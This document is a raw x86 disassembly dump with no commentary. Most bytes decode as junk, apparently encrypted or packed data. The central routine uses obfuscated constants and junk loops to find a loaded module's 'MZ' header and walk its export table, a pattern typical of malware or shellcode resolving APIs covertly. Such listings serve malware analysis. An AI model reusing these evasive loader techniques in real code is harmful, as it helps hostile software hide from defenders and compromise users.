  40e19f:	inc    ebx
  40e1a0:	xchg   edi,eax
  40e1a1:	js     0x40e1bd
  40e1a3:	aam    0x19
  40e1a5:	mov    bl,0x2d
  40e1a7:	repnz mul BYTE PTR [edi+0x37]
  40e1ab:	cmp    dl,bl
  40e1ad:	push   cs
  40e1ae:	lds    esp,FWORD PTR [ebp-0x34]
  40e1b1:	call   0x5274a828
  40e1b6:	leave  
  40e1b7:	sbb    BYTE PTR [edi-0x54ef335f],ah
  40e1bd:	and    DWORD PTR [ecx+0x73bcdf79],esi
  40e1c3:	cmp    ebx,DWORD PTR [eax-0x49542f58]
  40e1c9:	or     esp,DWORD PTR [esi+0x62]
  40e1cc:	or     BYTE PTR [ecx+0x67f7ea9c],dh
  40e1d2:	sbb    al,al
  40e1d4:	add    BYTE PTR ds:0x9f4df19e,al
  40e1da:	outs   dx,DWORD PTR ds:[esi]
  40e1db:	pop    ebp
  40e1dc:	sbb    al,0xa0
  40e1de:	dec    eax
  40e1df:	push   ecx
  40e1e0:	mov    dl,0xc8
  40e1e2:	rol    BYTE PTR [ebx+ecx*8+0x1543cf73],1
  40e1e9:	repnz xor al,BYTE PTR [edx+ebp*8-0x5f0acb9f]
  40e1f1:	cdq    
  40e1f2:	add    eax,edi
  40e1f4:	repnz lods al,BYTE PTR ds:[esi]
  40e1f6:	jno    0x40e1f8
  40e1f8:	lea    ecx,[ecx+0x152b2c68]
  40e1fe:	push   0x45e8075e
  40e203:	das    
  40e204:	xor    edx,DWORD PTR [edi+0x5d3c5c7c]
  40e20a:	(bad)  
  40e20b:	jnp    0x40e1e5
  40e20d:	cld    
  40e20e:	out    0x11,al
  40e210:	mov    dh,0xfc
  40e212:	pop    ebx
  40e213:	sbb    eax,0xc24bfce3
  40e218:	ds inc edx
  40e21a:	mov    WORD PTR [eax],?
  40e21c:	in     al,dx
  40e21d:	cmp    dh,BYTE PTR [edx+0x1e]
  40e220:	(bad)  
  40e222:	test   eax,0xa1c13385
  40e227:	aaa    
  40e228:	div    DWORD PTR [ebx]
  40e22a:	out    dx,eax
  40e22b:	data16 mov WORD PTR ds:[esp+eiz*2],es
  40e230:	les    eax,FWORD PTR [eax+ecx*8]
  40e233:	out    0xcc,eax
  40e235:	fnstcw WORD PTR [esi+0x64aead8]
  40e23b:	sar    DWORD PTR [eax+0x52],0x10
  40e23f:	jmp    0x9a02:0x8c083a2d
  40e246:	lods   al,BYTE PTR ds:[esi]
  40e247:	pushf  
  40e248:	fisttp WORD PTR [edi]
  40e24a:	xor    bl,bh
  40e24c:	push   es
  40e24d:	popa   
  40e24e:	test   bl,dl
  40e250:	lods   al,BYTE PTR ds:[esi]
  40e251:	add    dl,BYTE PTR [eax-0x7e]
  40e254:	pop    ss
  40e255:	lock adc eax,0x886a9212
  40e25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e25d:	jmp    0x55c3:0xd6388210
  40e264:	xor    DWORD PTR [edi-0x414c3c2d],ebp
  40e26a:	aaa    
  40e26b:	mov    ebp,0xce1990ac
  40e270:	leave  
  40e271:	jmp    0x40e25e
  40e273:	das    
  40e274:	pop    ds
  40e275:	mov    dl,0x8d
  40e277:	scas   al,BYTE PTR es:[edi]
  40e278:	out    dx,eax
  40e279:	retf   
  40e27a:	mov    eax,ds:0x1e697b51
  40e27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e280:	sar    DWORD PTR [esi+0x61],1
  40e283:	push   ds
  40e284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e285:	add    DWORD PTR [ecx+eax*2],0xffffffe5
  40e289:	mov    eax,cs
  40e28b:	ja     0x40e2cf
  40e28d:	jg     0x40e2c7
  40e28f:	hlt    
  40e290:	jmp    0x8114:0x5eb519d2
  40e297:	pop    eax
  40e298:	test   al,0xf3
  40e29a:	pop    eax
  40e29b:	push   0x65df97d5
  40e2a0:	es push edi
  40e2a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2a3:	pop    eax
  40e2a4:	jns    0x40e2f2
  40e2a6:	pop    edx
  40e2a7:	adc    ah,BYTE PTR [ebx+0x9f39206]
  40e2ad:	sub    ah,BYTE PTR [edi-0x3c]
  40e2b0:	icebp  
  40e2b1:	jae    0x40e319
  40e2b3:	push   ecx
  40e2b4:	xor    bp,WORD PTR ds:0xc175ca3
  40e2bb:	push   ebx
  40e2bc:	inc    esp
  40e2bd:	push   ebp
  40e2be:	repnz add al,0xc8
  40e2c1:	xor    DWORD PTR [ebx],ecx
  40e2c3:	call   0x2170db88
  40e2c8:	jp     0x40e289
  40e2ca:	(bad)  
  40e2cb:	out    dx,eax
  40e2cc:	mov    di,0xfc7
  40e2d0:	call   0xabfa984c
  40e2d5:	mov    eax,0x880d2812
  40e2da:	mov    cl,0xb0
  40e2dc:	test   al,0xb8
  40e2de:	je     0x40e332
  40e2e0:	(bad)  
  40e2e1:	jno    0x40e320
  40e2e3:	(bad)  
  40e2e4:	lock mov bl,0x42
  40e2e7:	inc    esi
  40e2e8:	mov    edi,0xe4bcef79
  40e2ed:	mov    ecx,0x475c658a
  40e2f2:	jo     0x40e2ad
  40e2f4:	xchg   esi,eax
  40e2f5:	fpatan 
  40e2f7:	xor    BYTE PTR [esi],ah
  40e2f9:	outs   dx,DWORD PTR ds:[esi]
  40e2fa:	(bad)  [edx-0x68]
  40e2fd:	push   esi
  40e2fe:	test   DWORD PTR [ecx+eiz*1+0x3bc595f2],ecx
  40e305:	test   DWORD PTR [eax+0x74f40328],0x13260a4a
  40e30f:	repz xchg ecx,eax
  40e311:	inc    esi
  40e312:	xchg   dl,ah
  40e314:	retf   0xea67
  40e317:	or     BYTE PTR [esi],cl
  40e319:	jmp    0x4b87:0x91b1deb6
  40e320:	gs in  eax,dx
  40e322:	jbe    0x40e367
  40e324:	lahf   
  40e325:	cld    
  40e326:	(bad)  [ecx+esi*8]
  40e329:	not    BYTE PTR [eax+esi*8+0x19bea6d]
  40e330:	xor    ecx,ebx
  40e332:	ror    BYTE PTR [ebx+edi*8+0x364208ca],1
  40e339:	and    eax,0x352e4f10
  40e33e:	daa    
  40e33f:	gs stos BYTE PTR es:[edi],al
  40e341:	bound  edx,QWORD PTR [edx+0x35]
  40e344:	xchg   esp,eax
  40e345:	lods   eax,DWORD PTR ds:[esi]
  40e346:	xor    eax,DWORD PTR [esi-0x4993e18d]
  40e34c:	or     bl,dh
  40e34e:	dec    ebx
  40e34f:	push   eax
  40e350:	je     0x40e3af
  40e352:	add    DWORD PTR [ebx-0xd],ecx
  40e355:	xchg   esi,eax
  40e356:	mov    cl,0x92
  40e358:	(bad)  
  40e359:	xor    DWORD PTR gs:[eax],ebp
  40e35c:	in     eax,0x61
  40e35e:	inc    esp
  40e35f:	lahf   
  40e360:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40e362:	jno    0x40e344
  40e364:	mov    BYTE PTR [ecx+esi*2],dl
  40e367:	js     0x40e3e7
  40e369:	ins    DWORD PTR es:[edi],dx
  40e36a:	jge    0x40e336
  40e36c:	or     ebp,ebx
  40e36e:	fwait
  40e36f:	sbb    al,0xe1
  40e371:	push   ds
  40e372:	and    BYTE PTR [edi],0x8d
  40e375:	pushf  
  40e376:	xor    eax,0x92a1769
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x32025ef2
  40e671:	xchg   ebx,edi
  40e673:	jae    0x40e63f
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e633
  40e67c:	je     0x40e62b
  40e67e:	push   0xfffffff8
  40e680:	inc    edi
  40e681:	enter  0x1db6,0xaf
  40e685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e686:	dec    esp
  40e687:	inc    eax
  40e688:	pop    edx
  40e689:	push   edi
  40e68a:	cmp    edi,DWORD PTR [edx-0x48]
  40e68d:	ror    ah,1
  40e68f:	add    ecx,DWORD PTR [ecx+ebp*4-0x3b]
  40e693:	gs loopne 0x40e6ad
  40e696:	inc    esi
  40e697:	aad    0xae
  40e699:	ror    BYTE PTR [eax-0x2b],cl
  40e69c:	push   ss
  40e69d:	jp     0x40e6d0
  40e69f:	and    DWORD PTR [edx-0x480a8661],edx
  40e6a5:	(bad)  
  40e6a6:	iret   
  40e6a7:	in     eax,0x40
  40e6a9:	in     al,dx
  40e6aa:	adc    edx,edx
  40e6ac:	dec    ebx
  40e6ad:	and    dh,bl
  40e6af:	rcr    BYTE PTR [ebp+0x1d],0x1a
  40e6b3:	not    BYTE PTR [edx+0x7bc8a327]
  40e6b9:	test   al,0xde
  40e6bb:	mov    WORD PTR [esp+edi*2+0x2a],cs
  40e6bf:	fs ja  0x40e65e
  40e6c2:	lds    edx,FWORD PTR [ebp+0x2aca4429]
  40e6c8:	idiv   DWORD PTR [ebp+0x103af4dc]
  40e6ce:	(bad)  
  40e6cf:	mov    al,0x9b
  40e6d1:	dec    eax
  40e6d2:	mov    esi,0x3ce78049
  40e6d7:	adc    edi,eax
  40e6d9:	mov    esi,0xf055c955
  40e6de:	and    eax,0x66b5247e
  40e6e3:	(bad)  
  40e6e4:	sahf   
  40e6e5:	fstp   TBYTE PTR [ebx-0x63451898]
  40e6eb:	sub    dl,BYTE PTR [ebx+ebx*2+0x7b9abc32]
  40e6f2:	scas   al,BYTE PTR es:[edi]
  40e6f3:	imul   DWORD PTR [ecx+edx*1+0x178338d1]
  40e6fa:	dec    esi
  40e6fb:	hlt    
  40e6fc:	and    DWORD PTR [esi+0x51],0xffffffa3
  40e700:	mov    ch,0x6f
  40e702:	cwde   
  40e703:	jmp    0x4cb36987
  40e708:	jecxz  0x40e69f
  40e70a:	je     0x40e6ab
  40e70c:	cs ins DWORD PTR es:[edi],dx
  40e70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e70f:	xor    DWORD PTR [edi],ebp
  40e711:	mov    ecx,0xb0e42b7
  40e716:	dec    ebp
  40e717:	dec    eax
  40e718:	gs xor ch,cl
  40e71b:	jl     0x40e6f8
  40e71d:	jno    0x40e739
  40e71f:	jge    0x40e6ea
  40e721:	inc    edx
  40e722:	retf   
  40e723:	push   edx
  40e724:	and    BYTE PTR [eax-0x3d],ah
  40e727:	mov    dh,0xfa
  40e729:	in     eax,dx
  40e72a:	inc    ebp
  40e72b:	xor    al,0xb7
  40e72d:	ins    BYTE PTR es:[edi],dx
  40e72e:	mov    eax,0x1edf97ba
  40e733:	ja     0x40e755
  40e735:	push   ebp
  40e736:	jne    0x40e764
  40e738:	xor    bh,BYTE PTR [edx]
  40e73a:	sbb    cl,BYTE PTR [ebp+eiz*8+0x7c]
  40e73e:	or     eax,DWORD PTR [ecx-0x1459c6c]
  40e744:	jl     0x40e7a4
  40e746:	jge    0x40e7b4
  40e748:	in     al,0x26
  40e74a:	(bad)  
  40e74b:	mov    ecx,0xd33fb73
  40e750:	mov    dl,0x43
  40e752:	jp     0x40e6da
  40e754:	es shl eax,cl
  40e757:	mov    eax,0x809340d4
  40e75c:	push   0x5f
  40e75e:	push   0xffffffb5
  40e760:	jne    0x40e6ed
  40e762:	or     eax,0xe5552b2
  40e767:	mov    dl,0x1b
  40e769:	pop    ebp
  40e76a:	fsubr  st(4),st
  40e76c:	push   ss
  40e76d:	push   edi
  40e76e:	call   0xbfa2:0x6042c319
  40e775:	push   0xffffffdd
  40e777:	inc    esp
  40e778:	pushf  
  40e779:	std    
  40e77a:	call   0x8aef:0x549ec1d9
  40e781:	(bad)  
  40e782:	push   eax
  40e783:	pop    ebx
  40e784:	jp     0x40e7c3
  40e786:	sbb    DWORD PTR [ebx+0x38],eax
  40e789:	pop    ebx
  40e78a:	add    DWORD PTR [ebx-0x5c],eax
  40e78d:	ins    BYTE PTR es:[edi],dx
  40e78e:	sub    BYTE PTR [ebx],bh
  40e790:	xchg   edi,eax
  40e791:	cli    
  40e792:	ret    
  40e793:	ins    DWORD PTR es:[edi],dx
  40e794:	mov    dh,0x1d
  40e796:	mov    dl,0x26
  40e798:	outs   dx,DWORD PTR ds:[esi]
  40e799:	push   es
  40e79a:	mov    cl,0xfa
  40e79c:	cmp    al,0x2d
  40e79e:	lahf   
  40e79f:	mov    edi,0xc5fbc9c6
  40e7a4:	inc    edx
  40e7a5:	out    0x3a,al
  40e7a7:	push   edi
  40e7a8:	aad    0x3a
  40e7aa:	pop    edx
  40e7ab:	or     eax,0xbf07ed0f
  40e7b0:	loop   0x40e7e0
  40e7b2:	xor    BYTE PTR [ecx-0x10],dh
  40e7b5:	aaa    
  40e7b6:	push   0x77
  40e7b8:	lds    eax,FWORD PTR [esi+0x40dac80c]
  40e7be:	cdq    
  40e7bf:	icebp  
  40e7c0:	add    BYTE PTR [esi+0x66c63e66],al
  40e7c6:	mov    ch,0x8c
  40e7c8:	ins    BYTE PTR es:[edi],dx
  40e7c9:	xchg   BYTE PTR [esi-0x18],ah
  40e7cc:	push   eax
  40e7cd:	mov    ah,0x1
  40e7cf:	xor    DWORD PTR [edx+0x40ee80ae],esp
  40e7d5:	xor    esi,DWORD PTR [eax]
  40e7d7:	je     0x40e7b0
  40e7d9:	(bad)  
  40e7da:	icebp  
  40e7db:	adc    al,0xc2
  40e7dd:	inc    ecx
  40e7de:	pushf  
  40e7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7e0:	xchg   edi,eax
  40e7e1:	sub    eax,0x2b057f3f
  40e7e6:	pushf  
  40e7e7:	add    ebp,DWORD PTR [eax+0x13]
  40e7ea:	ss repnz sar DWORD PTR gs:[ecx],1
  40e7ef:	push   eax
  40e7f0:	and    BYTE PTR [ebx],al
  40e7f2:	jo     0x40e824
  40e7f4:	mov    dl,0xff
  40e7f6:	sahf   
  40e7f7:	pop    ecx
  40e7f8:	jmp    0x40e7bc
  40e7fa:	shr    bl,0xc2
  40e7fd:	out    dx,al
  40e7fe:	pop    es
  40e7ff:	mov    al,0xd8
  40e801:	je     0x40e829
  40e803:	xchg   BYTE PTR [eax],dh
  40e805:	mov    cl,0x18
  40e807:	jge    0x40e818
  40e809:	xchg   ebx,eax
  40e80a:	mov    ecx,0xd6a3e67d
  40e80f:	jl     0x40e851
  40e811:	push   0xd7454888
  40e816:	mov    ah,0x23
  40e818:	jle    0x40e865
  40e81a:	mov    bl,0x64
  40e81c:	pop    ebp
  40e81d:	xchg   esp,eax
  40e81e:	call   0x28d76b09
  40e823:	xchg   ebx,eax
  40e825:	ret    
  40e826:	hlt    
  40e827:	jae    0x40e7d8
  40e829:	adc    DWORD PTR [esi+0x2d6697a0],eax
  40e82f:	sub    eax,0x244a9225
  40e834:	ss inc esi
  40e836:	push   esi
  40e837:	sub    edi,ebx
  40e839:	dec    edi
  40e83a:	jne    0x40e7d9
  40e83c:	sub    dl,BYTE PTR [esi-0x2e]
  40e83f:	adc    al,0xe5
  40e841:	xchg   BYTE PTR [ebx-0xe92d588],bh
  40e847:	jl     0x40e886
  40e849:	repnz (bad) [esi]
  40e84c:	ja     0x40e87a
  40e84e:	adc    ah,0xdf
  40e851:	clc    
  40e852:	rol    DWORD PTR [ebx],1
  40e854:	dec    esi
  40e855:	xchg   ebp,eax
  40e856:	jb     0x40e89d
  40e858:	(bad)  
  40e859:	int3   
  40e85a:	and    edx,DWORD PTR ds:0xd7992494
  40e860:	mov    bl,BYTE PTR [ecx]
  40e862:	jle    0x40e7f0
  40e864:	fsub   QWORD PTR [eax]
  40e866:	push   ebx
  40e867:	movd   mm2,DWORD PTR [edi+0x3e]
  40e86b:	(bad)  
  40e86c:	(bad)  [ecx+0x9]
  40e86f:	pop    ebp
  40e870:	adc    DWORD PTR [ebp-0x33],eax
  40e873:	push   ebp
  40e874:	mov    ebp,edi
  40e876:	rcr    dl,cl
  40e878:	mov    esi,0x30423cf9
  40e87d:	xchg   DWORD PTR ds:0x6e710e7c,esi
  40e883:	in     eax,dx
  40e884:	mov    bh,0xfb
  40e886:	ja     0x40e8ca
  40e888:	ret    0x9eb6
  40e88b:	sbb    eax,DWORD PTR [edi+0x4c]
  40e88e:	mov    es,WORD PTR [esi]
  40e890:	mov    ebx,0x680761a1
  40e895:	stos   DWORD PTR es:[edi],eax
  40e896:	(bad)  
  40e897:	push   esp
  40e898:	pop    es
  40e899:	cwde   
  40e89a:	jnp    0x40e8dd
  40e89c:	stc    
  40e89d:	inc    edi
  40e89e:	sbb    cl,BYTE PTR [eax+edi*4]
  40e8a1:	ror    DWORD PTR [eax+0x2b52ec82],1
  40e8a7:	adc    eax,0xde41fcd8
  40e8ac:	test   al,0xb0
  40e8ae:	xchg   cl,dl
  40e8b0:	adc    dh,BYTE PTR [edx+0x68]
  40e8b3:	test   DWORD PTR [eax-0x72f4b6c4],edx
  40e8b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ba:	fdivr  QWORD PTR fs:[edx]
  40e8bd:	mov    bl,0xd5
  40e8bf:	loopne 0x40e902
  40e8c1:	push   esi
  40e8c2:	shl    DWORD PTR [esi],cl
  40e8c4:	loopne 0x40e8c8
  40e8c6:	enter  0xb837,0x21
  40e8ca:	pop    ss
  40e8cb:	ins    BYTE PTR es:[edi],dx
  40e8cc:	loopne 0x40e89b
  40e8ce:	sahf   
  40e8cf:	mov    esp,0xec781357
  40e8d4:	fwait
  40e8d5:	push   ecx
  40e8d6:	adc    bl,BYTE PTR ds:0x37cf2313
  40e8dc:	adc    edx,DWORD PTR [edi-0x2a]
  40e8df:	jns    0x40e8f2
  40e8e1:	and    edx,0x28726ab6
  40e8e7:	enter  0x8d3d,0x7b
  40e8eb:	dec    esi
  40e8ec:	sbb    BYTE PTR [esi],dh
  40e8ee:	sbb    BYTE PTR [edx+0x1ef41be9],bh
  40e8f4:	enter  0x8f57,0x32
  40e8f8:	mul    BYTE PTR [ebx]
  40e8fa:	shr    DWORD PTR [edx],cl
  40e8fc:	fwait
  40e8fd:	jecxz  0x40e8bc
  40e8ff:	push   esi
  40e900:	pop    esp
  40e901:	loope  0x40e968
  40e903:	jg     0x40e89a
  40e905:	fwait
  40e906:	jmp    0xcf29:0x5819e558
  40e90d:	scas   al,BYTE PTR es:[edi]
  40e90e:	imul   DWORD PTR [eax+ebp*1+0x41d0c73]
  40e915:	sbb    esi,DWORD PTR [esi+esi*8-0x52f7748d]
  40e91c:	jecxz  0x40e91a
  40e91e:	std    
  40e91f:	xchg   ebx,eax
  40e920:	jae    0x40e984
  40e922:	jg     0x40e926
  40e924:	leave  
  40e925:	mov    edi,0x73ec3e15
  40e92a:	xchg   esp,eax
  40e92b:	cld    
  40e92c:	pop    es
  40e92d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e92e:	cmp    esi,DWORD PTR [edx]
  40e930:	xor    BYTE PTR [edi],bl
  40e932:	mov    al,ds:0xa96ac167
  40e937:	jne    0x40e923
  40e939:	sbb    DWORD PTR [ebx],0xf04f0ce4
  40e93f:	(bad)  
  40e940:	pushf  
  40e941:	push   eax
  40e942:	adc    eax,DWORD PTR [ebp+0x17]
  40e945:	cmp    dh,al
  40e947:	das    
  40e948:	pop    ss
  40e949:	push   eax
  40e94a:	mov    al,ds:0x3e018e3
  40e94f:	pop    ebx
  40e950:	out    0x4a,al
  40e952:	ja     0x40e96a
  40e954:	jp     0x40e8e7
  40e956:	sbb    BYTE PTR es:[esi],dh
  40e959:	and    cl,ah
  40e95b:	pop    ds
  40e95c:	sahf   
  40e95d:	pop    ebp
  40e95e:	in     al,0x2a
  40e960:	scas   al,BYTE PTR es:[edi]
  40e961:	scas   eax,DWORD PTR es:[edi]
  40e962:	sbb    BYTE PTR [ebx-0x2f],bl
  40e965:	lds    edi,FWORD PTR [esi+0x52]
  40e968:	jo     0x40e907
  40e96a:	push   ebp
  40e96b:	or     esi,DWORD PTR ds:0xa06147c2
  40e971:	out    0xa3,al
  40e973:	in     al,0x85
  40e975:	sbb    eax,esp
  40e977:	push   eax
  40e978:	(bad)  
  40e979:	mov    al,0xd5
  40e97b:	dec    ecx
  40e97c:	into   
  40e97d:	nop
  40e97e:	xor    DWORD PTR [ebx],eax
  40e980:	sbb    ecx,ebp
  40e982:	(bad)
  40e986:	test   DWORD PTR [esi],ecx
  40e988:	out    0x66,al
  40e98a:	push   edx
  40e98b:	fcom   DWORD PTR [esi]
  40e98d:	imul   eax,esp,0xe2473e3a
  40e993:	lea    edi,[edx+ebp*8]
  40e996:	loop   0x40e92a
  40e998:	jp     0x40e9fe
  40e99a:	fst    DWORD PTR [eax-0xf]
  40e99d:	sahf   
  40e99e:	ds pop edi
  40e9a0:	jmp    0x392593e
  40e9a5:	mov    bl,BYTE PTR [ebx+0x379a9443]
  40e9ab:	cs push esp
  40e9ad:	out    0xeb,eax
  40e9af:	popa   
  40e9b0:	mov    al,ds:0xce705f07
  40e9b5:	push   ecx
  40e9b6:	clc    
  40e9b7:	jbe    0x40ea0c
  40e9b9:	sub    DWORD PTR [edi],ebp
  40e9bb:	mov    bh,0xcf
  40e9bd:	mov    al,ds:0x7592d53b
  40e9c2:	push   edx
  40e9c3:	ins    DWORD PTR es:[edi],dx
  40e9c4:	sbb    eax,0x8e653d23
  40e9c9:	adc    BYTE PTR [edi+0x5698cd1d],dh
  40e9cf:	add    bl,BYTE PTR [edi+0x48]
  40e9d2:	loope  0x40e9e2
